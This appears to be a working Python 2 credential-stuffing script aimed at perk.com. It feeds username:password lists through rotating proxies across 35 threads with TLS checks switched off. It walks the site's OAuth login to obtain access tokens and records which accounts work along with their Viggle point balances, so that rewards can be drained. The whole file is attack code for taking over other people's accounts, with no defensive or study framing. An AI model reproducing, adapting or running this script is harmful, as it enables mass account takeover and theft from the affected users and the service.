import requests
import re
import Queue
import random
import time
import codecs
from threading import Thread

requests.packages.urllib3.disable_warnings()

with codecs.open('Proxies Working.txt', 'r', encoding='utf-8') as f:
	proxies = f.readlines()
	
def check(q):
	s = requests.session()
	while True:
		c = q.get()
		user = c.split(':')[0]
		passw = c.split(':')[1]
		print 'Testing', user
		er = True
		while er:
			s.cookies.clear()
			try:
				proxy = random.choice(proxies).strip()
				#proxy = '127.0.0.1:8888'
				prozy = {
					'http': proxy,
					'https': proxy
				}
				works = False
				headers = {
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2810.2 Safari/537.36',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept': 'application/json, text/plain, */*',
					'Accept-Language': 'en-US,en;q=0.8',
					'Referer': 'http://perk.com/home/',
				}
				
				r = s.get(
					'https://auth.perk.com/oauth?client_id=perk_web&redirect_uri=https%3A%2F%2Fv2.perk.com%2Fauthentication%2Foauth2%2Fcallback&product_identifier=web_browser&client_name=Perk.com&response_type=code&state=login',
					verify=False,
					proxies=prozy,
					timeout=16,
					headers=headers
				)
				headers['Content-Type'] = 'application/json;charset=UTF-8'
				headers['Referer'] = 'https://auth.perk.com/login'
				headers['X-XSRF-TOKEN'] = s.cookies.get_dict()['XSRF-TOKEN']
				r = s.post(
					'https://auth.perk.com/signin',
					json={"email":user,"password":passw,"signin":True},
					verify=False,
					proxies=prozy,
					timeout=16,
					headers=headers
				)
				if 'The email or password' in r.text:
					print user, 'does not work!'
					works = True
				elif 'status":"success' in r.text:
					works = True
					r = s.post(
								'https://auth.perk.com/authorize',
								json={"authorization":"Approve"},
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					ac = re.findall('callback\?code=(.*?)&', r.text)[0]
					r = s.get(
								'https://web-api.perk.com/v1/authentication/authorize?code={0}&client_identifier=perk_web&grant_type=authorization_code&product_identifier=web_browser&redirect_uri=https:%2F%2Fv2.perk.com%2Fauthentication%2Foauth2%2Fcallback'.format(ac),
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					ac = re.findall('access_token":"(.*?)"', r.text)[0]
					r = s.get(
								'https://api-v2.perk.com/v2/users/{0}.json?includes[]=address'.format(ac),
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					if 'viggle' in r.text:
						points = re.findall('available_perks":(.*?),', r.text)[0]
						vp = re.findall('remaining_viggle_points":(.*?),', r.text)[0]
						left = re.findall('remaining_points_this_month":(.*?),', r.text)[0]
						if int(vp) != 0:
							f = open("viggle.txt", "a")
							f.write('{0}:{1} - Viggle: {2}	Month: {4}	Perk Worth: {3}\n'.format(user, passw, vp, left * 0.05, left))
							f.close()
						print vp
						print user, 'works!'
				
				if not 'An error has occurred. ' in r.text:
					er = False
					
				if works:
					f = open("vchecked.txt", "a")
					f.write('{0}:{1}\n'.format(user, passw))
					f.close()
				q.task_done()
			except Exception, e:
				#print e
				proxy = random.choice(proxies)
	
def main():
	with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
		users = f.readlines()
	with codecs.open('vchecked.txt', 'r', encoding='utf-8') as f:
		checked = f.read()
		
	queue = Queue.Queue()
	
	for _ in range(int(35)):
		worker = Thread(target=check, args=(queue,))
		worker.start()
	for user in users:
		queue.put(user.strip().encode('ascii', 'ignore'))
			
if __name__ == '__main__':
	main()